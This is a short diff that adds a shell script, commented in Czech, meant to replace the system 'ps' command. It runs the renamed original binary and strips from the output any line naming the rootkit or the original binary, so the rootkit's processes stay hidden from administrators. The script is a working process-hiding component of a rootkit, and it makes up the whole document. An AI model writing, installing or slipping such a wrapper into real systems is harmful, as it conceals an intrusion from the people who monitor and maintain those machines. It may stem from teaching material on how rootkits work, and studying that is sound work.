@@ -1,0 +1,4 @@
+#!/bin/sh
+
+# z vystupu puvodniho ps se odmaze nazev rootkitu a nazev originalniho ps
+ps-original $* | grep -v rootkit | grep -v ps-original
